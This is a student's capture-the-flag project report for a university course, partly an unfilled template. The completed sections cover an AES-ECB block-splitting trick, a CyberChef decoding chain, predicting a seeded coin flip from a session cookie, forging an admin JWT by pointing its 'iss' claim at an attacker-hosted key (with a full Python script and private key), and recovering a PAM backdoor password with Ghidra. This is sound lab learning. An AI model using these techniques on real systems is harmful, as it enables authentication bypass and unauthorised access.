<div style="display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh;">
  
  <h2>CITS1003 Project Report</h2>
  
  <p>Student ID: Student 24059081</p>
  <p>Student Name: Ziying Zhou</p>

</div>

# Part 1 - Linux and Networking
## Emu Hack #1 - Backdoored
### Step 1

### Step 2

### Step 3

#### Flag Found
```bash
UWA{}
```

## Emu Hack #2 - Git Gud
### Step 1

### Step 2

### Step X

#### Flag Found
```bash
UWA{}
```

## Emu Hack #3 - SSH Tricks
### Step 1
A clear, and detailed description.  

### Step 2
### Step X

#### Flag Found
```bash
UWA{xxxxxxxxxx}
```

## Emu Hack #4 - Git Gud or GTFO Bin
### Step 1
A clear, and detailed description. 

### Step 2
### Step X

#### Flag Found
```bash
UWA{xxxxxxxxxx}
```

# Part 2 - Cryptography
## Advanced Emu Standard
### Step 1
This scenario describes the use of AES-128 encryption algorithm to encrypt data in ECB (Electronic Codebook) mode.
Because AES-128 operates with a block size of 16 bytes. The website can only encrypt 31 bytes of data at a time. However, command `deactivate_special_procedure_123` has 32 bytes long So I devided this command into two parts both only have 16 bytes of it.
```bash
deactivate_speci
```
```bash
al_procedure_123
```

### Step 2
I put these two command `deactivate_speci` and `al_procedure_123` into Command Encryptor respectively.
Then I gain the ciphertext `3155433d53ed30c89aef89b2e7273924` and `4127efafc809cc1209376d039e0001f1`.
Now put them together.
```bash
3155433d53ed30c89aef89b2e72739244127efafc809cc1209376d039e0001f1
```
### Step 3
Put the cyphertext into Transmit encrypted command and get the flag.
#### Flag Found
```bash
UWA{3CB_i5_bL0cK_Ind3peNd3nt!}
```

## Emu Cook Book
### Step 1
`H4sI` is an identifier that indicates that a string of data is compressed using gzip and encoded as the beginning of Base64 format
At the end of the cyphertext, there are two '=' which is also likely to be Base64. 
So I try to use `From Base64` and `Gunzip` first in Cyberchef.
Then I gain these:
```
00000000%20%2035%2036%2020%2035%2036%2020%2036%2034%2020%2034%2032%2020%2036%2035%2020%2033%20%20%7C56%2056%2064%2042%2065%203%7C%0A00000010%20%2033%2020%2035%2032%2020%2034%2039%2020%2034%2064%2020%2033%2031%2020%20......
```
### Step 2
As we can see above, the text includes special characters like '%' in it. It might be the URL encoding format, so I use `URL Decode`
And it becomes like this:
```
00000000  35 36 20 35 36 20 36 34 20 34 32 20 36 35 20 33  |56 56 64 42 65 3|
00000010  33 20 35 32 20 34 39 20 34 64 20 33 31 20 33 39  |3 52 49 4d 31 39|
......
```
### Step 3
The result we gained from last step is `Hexdump` format, so I use `From Hexdump` in cyberchef, then we obtained a set of hexadecimal numbers.
Easily, use `From Hex` in cyberchef.
Then we have:
```
VVdBe3RIM19lTW9PNV93MUxMX24zVjNyX3NUb1BfZDAxbkdfdEgzNWVfZFZtQl9jMUJyX2NIM2VGX2NoNExsU30=
```
Similarly, it ends with '='. So I assume it is a base64 text and use `From Base64` again.
And we have the flag now.
#### Flag Found
```bash
UWA{tH3_eMoO5_w1LL_n3V3r_sToP_d01nG_tH35e_dVmB_c1Br_cH3eF_ch4LlS}
```

## Emu Casino
### Step 1
#### What is seed?
As we can see from the `filp_coin.py` file, `seed(str(session["round"]) + "_" + session["session_id"])` is the main thing to decide the result.
The seed() function in Python initializes the random number generator with a specific starting point, allowing for reproducible random outcomes.
The seed here is consist of two parts: first one is `session["round"]` which is the round of the game, the second one is `session["session_id"]` which can be found in the cookie.
### Step 2
#### Find the session id:
We can right click on the page `http://34.87.251.234:3000/` and select `inspect`. Then find `Application` and we can see `cookie` on the left panel.
The cookie value we found is:
```
eyJjcmVkaXRzIjoxMCwicm91bmQiOjEsInNlc3Npb25faWQiOiJiYTNlNTJiMTc0M2Y3MzUxOGM4YmEwYzY1YjAzYTliYyJ9.ZkiIpw.pTUdUQa5nkII0zkbM7EBa8RXQY4
```
This is base64 text, so we can decode it through CyberChef: `https://cyberchef.io/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true)`.
CyberChef is a web-based tool for encoding, decoding, encrypting, decrypting, and analyzing data through a wide array of operations.

After we use `From Base64` , we got:
```
{"credits":10,"round":1,"session_id":"ba3e52b1743f73518c8ba0c65b03a9bc"}fH.§
SQÕ.k.ä .3.³;..¼Et.ä
```
So the session id is `ba3e52b1743f73518c8ba0c65b03a9bc`.
### Step 3
#### Use `solution.py`:
As the solution provided:
```

def flip_coin():
    # Change this line
    session_id = ""
    # Change this line
    round = 0

    seed(str(round) + "_" + session_id)

    print(choice(["tails", "heads"]))
```
Only thing we need to do is filling the session id and round number in it and we will get the prediction.
#### Flag Found
```bash
UWA{R0LLl111Llli1iNg_1N_C4$$$$h!11!}
```

## EWT
### Step 1
#### Find the flaw:
Open the `website.js` file, is easily to find the code below:
```
if (signingAlgo === "RS256") {
        // Grab where the RS256 public key URL from the "iss" claim in the JWT body
        // We currently haven't figured out how to sign our own RS256 JWTs yet...
        const issuerUrl = decodedBody.iss;

        // Make sure those hoomans aren't hacking with something like file://
        const regExp = new RegExp("^https?://");
        if (!regExp.test(issuerUrl)) {
            throw Error("invalid URL in iss claim");
        }
        
        // Should be fine to download the public key
        key = await downloadFromUrl(issuerUrl);
    }
```
In the comment, it reveals that EMU didn't use RS256 to sign their JWT. So we can use a JWT signed with RS256 to bypass the verification.
### Step 2
#### How is the JWT consist of:
JWT (JSON Web Token) is a compact, URL-safe means of representing claims to be transferred between two parties, commonly used for authentication and information exchange in web applications.
As we can find this JWT in site `http://34.87.251.234:3002/` :
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InBlYXNhbnQtaG9vbWFuIiwiaWF0IjoxNzE2MDMwNTMzfQ.AXthaVqinWUo9K0DAWdzOyq-KL2H3_09GQsPw7RngrY
```
Now decode it through Cyberchef to look at the structure.
```
{"alg":"HS256","typ":"JWT"}{"username":"peasant-hooman","iat":1716030533}..¶..ª)ÖR.JÐ0.w3²¨¢ö.}=...Ã´g.¶
```
This JWT is signed with HS256 algorithm. Still in the `website.js`, a comment: ` // If the username is "superior-emu" in the JWT then give them the pressie` replies that we can use username:`superior-emu` to sign the JWT. Then how?
### Step 3
#### Create the new JWT:
To force the emu download our public key signed by RS256, we need to create an URL where can be read by emu.
Using CyberChef, `Generate RSA Key Pair` can provide a pair of RSA key.
```
-----BEGIN PUBLIC KEY-----
MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDWJNveamCYETN8BeTUxHL8AOGs
Kc0YqlYtpUqGQtMAGFe4FpDg+/zXgLd654K6bderJxVVd7SvZEU66Uz+TFpAPlxc
MO72l4bsTbSuNQtuqsDT6s5nRTXX1PbruY+FJfxB0KjrYOk47xqtI/hDT0NJn5WL
uQPL30p13CJR7LzI3wIDAQAB
-----END PUBLIC KEY-----

-----BEGIN RSA PRIVATE KEY-----
MIICXQIBAAKBgQDWJNveamCYETN8BeTUxHL8AOGsKc0YqlYtpUqGQtMAGFe4FpDg
+/zXgLd654K6bderJxVVd7SvZEU66Uz+TFpAPlxcMO72l4bsTbSuNQtuqsDT6s5n
RTXX1PbruY+FJfxB0KjrYOk47xqtI/hDT0NJn5WLuQPL30p13CJR7LzI3wIDAQAB
AoGANg5s4CrLQmfJLswQFTOX8QxJ61tL9id9hJ0+gEDbIaGDdylfHiQOEdpgtqo9
QlFbCU3e4UnL9yBhJ3tgH6tndmzxercs5DY9a8ZOx+i7hHgM2y+ZpqQ7ywgXe3wt
JqVnro5uKh3u3iYd0BQLBD7niWMZo0dt0IUp+aF05XnZOlUCQQDrjLaXXQSo4reI
WnHkl1+jLKO6o+7uFN4/gEVkS8HolYC0mH5mAkID/UzWT6cq0Jeleoo3U++N3eUR
6sW4cnFLAkEA6Lxi9wSgkuBexcL+XsaoXyakQRT2+AJK/QxwuD6K9XDIRcOeNdIw
XgEzvUwBxXw7C/RsJaba9uI6X9qEUvMePQJAb1jBJ6QtA7jIkYhPtoNoDjaX3y6H
T7xFozb7loHJVCz3/mbnuUjv8/rVS6mzmCWqyeq3U5g18ZYnJuUYOiy/KQJBAMDi
WLbWm+n+kC0ghUaxKBvr35ecs24qIFIGfGkGVI5EEYdYL4f1kmZmYqYRFyq/4gPv
Z63w0mpoZe7JIH/KxBUCQQDIQrF0gBGPLClybl+nu7aFwHP1Rd8UO8J07D7fYDgp
HTJ1KHF6KV9Pi7g0jeTijsOVqlZNZNn90p/XNyEhtWtL
-----END RSA PRIVATE KEY-----
```
We can use website `https://text.is/` to keep the public key. Now we got the URL:`https://text.is/KXRZ8/raw`.
In the context of JWT (JSON Web Tokens), iss stands for "issuer" and is a claim that identifies the principal that issued the JWT.
So we are going to put the URL into iss: iss:"https://text.is/KXRZ8/raw".
By combining all the things we know and put it into a python file(for generating the JWT)
```
import jwt
from datetime import datetime, timedelta

private_key = """-----BEGIN RSA PRIVATE KEY-----
MIICXQIBAAKBgQDWJNveamCYETN8BeTUxHL8AOGsKc0YqlYtpUqGQtMAGFe4FpDg
+/zXgLd654K6bderJxVVd7SvZEU66Uz+TFpAPlxcMO72l4bsTbSuNQtuqsDT6s5n
RTXX1PbruY+FJfxB0KjrYOk47xqtI/hDT0NJn5WLuQPL30p13CJR7LzI3wIDAQAB
AoGANg5s4CrLQmfJLswQFTOX8QxJ61tL9id9hJ0+gEDbIaGDdylfHiQOEdpgtqo9
QlFbCU3e4UnL9yBhJ3tgH6tndmzxercs5DY9a8ZOx+i7hHgM2y+ZpqQ7ywgXe3wt
JqVnro5uKh3u3iYd0BQLBD7niWMZo0dt0IUp+aF05XnZOlUCQQDrjLaXXQSo4reI
WnHkl1+jLKO6o+7uFN4/gEVkS8HolYC0mH5mAkID/UzWT6cq0Jeleoo3U++N3eUR
6sW4cnFLAkEA6Lxi9wSgkuBexcL+XsaoXyakQRT2+AJK/QxwuD6K9XDIRcOeNdIw
XgEzvUwBxXw7C/RsJaba9uI6X9qEUvMePQJAb1jBJ6QtA7jIkYhPtoNoDjaX3y6H
T7xFozb7loHJVCz3/mbnuUjv8/rVS6mzmCWqyeq3U5g18ZYnJuUYOiy/KQJBAMDi
WLbWm+n+kC0ghUaxKBvr35ecs24qIFIGfGkGVI5EEYdYL4f1kmZmYqYRFyq/4gPv
Z63w0mpoZe7JIH/KxBUCQQDIQrF0gBGPLClybl+nu7aFwHP1Rd8UO8J07D7fYDgp
HTJ1KHF6KV9Pi7g0jeTijsOVqlZNZNn90p/XNyEhtWtL
-----END RSA PRIVATE KEY-----"""

payload = {
    'username': 'superior-emu', 
    'iss': 'https://text.is/KXRZ8/raw' 
}
# Sign JWT with RSA256
encoded_jwt = jwt.encode(payload, private_key, algorithm='RS256')
print("Generated JWT:", encoded_jwt)
```
we can obtain:
```
Generated JWT: eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InN1cGVyaW9yLWVtdSIsImlzcyI6Imh0dHBzOi8vdGV4dC5pcy9LWFJaOC9yYXcifQ.OtYLcA-LcQGuWC405HuJxtV5xADgYBM7bL78JlrFMiZcMwq-6w2Br9ZC2u3AqQz9wVhYrZrbI9h0rS_YWC6ExN9SUXCQjNjnT54wudo19xWfqveE82E6Ed_Ir1MCWwHfMb3NvbAWqYdKvmS-Y1PWLypA7siUOC869qcwbz6AZqg
```
Put this JWT into the server.
#### Flag Found
```bash
UWA{w4iT_wHeR3_d1D_u_g1T_d4t_k3y???}
```

# Part 3 - Forensics
## Caffeinated Emus
### Step 1
A clear, and detailed description.  

### Step 2
### Step X

#### Flag Found
```bash
UWA{xxxxxxxxxx}
```

## Flightless Data
### Step 1
A clear, and detailed description.  

### Step 2
### Step X

#### Flag Found
```bash
UWA{xxxxxxxxxx}
```

## Ruffled Feathers
### Step 1
A clear, and detailed description.  

### Step 2
### Step X

#### Flag Found
```bash
UWA{xxxxxxxxxx}
```

## Emu in the Shell
### Step 1
#### SSH login to server:
Connect to the server via SSH using the provided account information. Using commands:
```
ssh-p 2022 ir-account@34.87.251.234
```
`- p 2022` is the specified port, the username is `ir-account`, and the server address is `34.87.251.234`.  

Find and check the PAM module:
Once logged in, we need to check the files in the `/lib/x86_64 Linux gnu/security` directory to find any recently modified PAM modules. We can use the following command to view the modification time of a file:
```
ls lt/lib/x86_64 Linux gnu/security
```
To find the file be changed by EMU, we can go to this blog: `https://github.com/zephrax/linux-pam-backdoor`. Then we will know the file `pam_unix.so` is what er are looking for.
### Step 2
#### Now copy this file to local folder:
Let's copy the files to the `/tmp` directory, which is usually open to all users for write access. Use the following command:
(Ensure that you execute this command in the terminal of the Kali environment)
```
scp -P 2022 ir-account@34.87.251.234:/tmp/pam_unix.so ~/pam_unix.so
```
### Step 3
#### Analyse what did EMU change in pam_unix.so:
Use Ghidra to do it: (download it through: `https://ghidra-sre.org/`).
We also need to download JDK (version need to higher than 17)

Now open Ghidra and import `pam_unix.so` and `analyse` it. As we knew from the clue, there is an account called 'emu-haxor', so we can use this as the keyword to search in the file.

![image](https://github.com/GLRY-M/cits1003/assets/169660884/bf625be8-22b5-4103-a692-4b7ff54ba2f4)

There is an item `pUpPet_m4sT3r`. It probably is the password for emu-haxor account. So log in the emu-haxor now:
```
ssh-p 2022 emu-haxor@34.87.251.234
```
The flag should be in it right now, use `ls` have a look at what's in here and we can find there is a `flag.txt` here -- is what we are looking for:
```
cat flag.txt
```

#### Flag Found
```bash
UWA{tH15_eMu_w1Ll_aLw4y5_b3_iN_uR_sH3lLlLllL!11!}
```

# Part 4 - Vulnerabilities
## Feathered Forum - Part 1
### Step 1
A clear, and detailed description.  

### Step 2
### Step X

#### Flag Found
```bash
UWA{xxxxxxxxxx}
```

## Feathered Forum - Part 2
### Step 1
A clear, and detailed description.  

### Step 2
### Step X

#### Flag Found
```bash
UWA{xxxxxxxxxx}
```

## Feathered Forum - Part 3
### Step 1
A clear, and detailed description.  

### Step 2
### Step X

#### Flag Found
```bash
UWA{xxxxxxxxxx}
```

## Emu Apothecary
### Step 1
A clear, and detailed description.  

### Step 2
### Step X

#### Flag Found
```bash
UWA{xxxxxxxxxx}
```
